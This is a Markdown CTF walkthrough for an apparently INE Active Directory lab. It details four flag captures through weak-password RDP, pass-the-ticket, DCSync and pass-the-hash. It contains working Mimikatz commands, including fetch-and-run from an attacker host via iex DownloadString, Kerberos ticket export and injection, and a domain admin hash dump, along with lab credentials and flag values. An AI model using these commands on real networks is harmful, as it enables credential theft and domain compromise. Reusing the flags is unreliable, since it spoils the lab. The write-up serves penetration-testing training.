@@ -1,0 +1,203 @@
+# 🛡️ INE Active Directory CTF Lab - Flag Walkthrough & Recovery Plan
+
+## 🎯 Objective
+
+Exploit a misconfigured Active Directory environment, moving laterally from the initial foothold (student user) to other systems in the network and retrieving 4 flags. This guide documents the exact, working steps used to obtain each flag.
+
+---
+
+## 🏁 Flag 1 - Initial Access via RDP to `student`
+
+### 🔐 Credentials
+
+* **Username:** bobby
+* **Password:** password1
+
+### 🖥️ Access Method
+
+* RDP to `student.research.security.local`
+* No GUI admin session, but user can run PowerShell **as Administrator** manually.
+
+### ✅ Flag Path
+
+* Desktop file visible as `C:\Users\bobby\Desktop\Flag1.txt`
+
+### ♻️ Recovery Steps
+
+1. RDP into `student.research.security.local` as bobby.
+2. Right-click PowerShell > Run as Administrator.
+3. Read flag:
+
+   ```powershell
+   Get-Content C:\Users\bobby\Desktop\Flag1.txt
+   ```
+
+---
+
+## 🏁 Flag 2 - Lateral Movement to `johnny`
+
+### 🎯 Goal
+
+Move laterally to `johnny.research.security.local` using credentials found.
+
+### 🔐 Credentials Used
+
+* **Username:** johnny
+* **Password:** password1
+
+### 🖥️ Access Method
+
+* RDP into `johnny.research.security.local`
+
+### ✅ Flag Path
+
+* Desktop file: `C:\Users\johnny\Desktop\Flag2.txt`
+
+### ♻️ Recovery Steps
+
+1. Use `johnny:password1` to RDP into `johnny.research.security.local`.
+2. Read flag:
+
+   ```powershell
+   Get-Content C:\Users\johnny\Desktop\Flag2.txt
+   ```
+
+---
+
+## 🏁 Flag 3 - Pass-the-Ticket from `johnny` → `seclogs`
+
+### 🎯 Goal
+
+Use Kerberos ticket impersonation to access `seclogs.research.security.local` and retrieve the flag.
+
+### 📦 Required Tools (on Johnny)
+
+* `Invoke-Mimikatz.ps1`
+* `PowerView.ps1`
+* `PsExec64.exe`
+* Hosted on attacker machine (via HFS): `http://10.0.5.101`
+
+### ✅ Working Steps
+
+1. From `johnny` system:
+
+   ```powershell
+   cd C:\Tools
+   powershell -ep bypass
+   . .\PowerView.ps1
+   . .\Invoke-Mimikatz.ps1
+   Find-LocalAdminAccess
+   ```
+
+   ➔ Confirmed access to: `seclogs.research.security.local`
+
+2. Start PowerShell Remoting session:
+
+   ```powershell
+   Enter-PSSession seclogs.research.security.local
+   ```
+
+3. Download & run Invoke-Mimikatz:
+
+   ```powershell
+   cd \
+   iex (New-Object Net.WebClient).DownloadString('http://10.0.5.101/Invoke-Mimikatz.ps1')
+   Invoke-Mimikatz -Command '"sekurlsa::tickets /export"'
+   ls | select name
+   ```
+
+   ➔ Use any `krbtgt` ticket such as:
+
+   ```
+   [0;3e7]-2-1-40e10000-SECLOGS$@krbtgt-RESEARCH.SECURITY.LOCAL.kirbi
+   ```
+
+4. Inject the ticket:
+
+   ```powershell
+   Invoke-Mimikatz -Command '"kerberos::ptt [TICKET_NAME].kirbi"'
+   ```
+
+5. Verify session with `klist`. Confirm `student@RESEARCH.SECURITY.LOCAL` ticket.
+
+6. Read flag:
+
+   ```powershell
+   Get-Content C:\Flag3.txt
+   ```
+
+### ✅ Flag Output
+
+`69d92fbe2fc42f9ebbac83faf5b37202`
+
+### ♻️ Recovery Steps
+
+* RDP into `johnny.research.security.local`
+* Start PowerShell as admin
+* Re-import PowerView & Invoke-Mimikatz
+* Enter PSSession into seclogs
+* Inject correct `.kirbi` ticket
+* Run `klist` to verify session
+* Retrieve flag from root `C:\`
+
+---
+
+## 🏁 Flag 4 - Domain Controller Compromise via DCSync & Pass-the-Hash
+
+### 🎯 Goal
+
+Use `DCSync` to extract the Administrator NTLM hash, and perform a Pass-the-Hash attack to impersonate the Domain Admin and retrieve the final flag from `prod.research.security.local`.
+
+### ✅ Working Steps
+
+1. On `seclogs.research.security.local`, download and import Mimikatz:
+
+   ```powershell
+   Invoke-WebRequest -Uri "http://10.0.5.101:80/Invoke-Mimikatz.ps1" -Outfile Invoke-Mimikatz.ps1
+   . .\Invoke-Mimikatz.ps1
+   ```
+
+2. Run DCSync to dump Domain Admin hash:
+
+   ```powershell
+   Invoke-Mimikatz -Command '"privilege::debug" "token::elevate" "lsadump::dcsync /domain:research.security.local /user:CN=Administrator,CN=Users,DC=research,DC=security,DC=local"'
+   ```
+
+   ➔ NTLM hash extracted:
+
+   ```
+   38a08b8218669328bf7b82bdff3b81d9
+   ```
+
+3. Use Pass-the-Hash to spawn a new elevated PowerShell session as Administrator:
+
+   ```powershell
+   Invoke-Mimikatz -Command '"sekurlsa::pth /user:administrator /domain:research.security.local /ntlm:38a08b8218669328bf7b82bdff3b81d9 /run:powershell.exe"'
+   ```
+
+4. From new shell, connect to the Domain Controller:
+
+   ```powershell
+   Enter-PSSession prod.research.security.local
+   ```
+
+5. Navigate to root of `C:\` and read the flag:
+
+   ```powershell
+   Get-Content C:\Flag4.txt
+   ```
+
+### ✅ Flag Output
+
+`df62bb8af9001d0ff0caaa26d1f44856`
+
+### ♻️ Recovery Steps
+
+* Re-run DCSync from `seclogs.research.security.local`
+* Use `Invoke-Mimikatz` to perform Pass-the-Hash attack
+* Use `Enter-PSSession` to access `prod.research.security.local`
+* Retrieve `C:\Flag4.txt`
+
+---
+
+## ✅ Status: All 4 Flags Captured
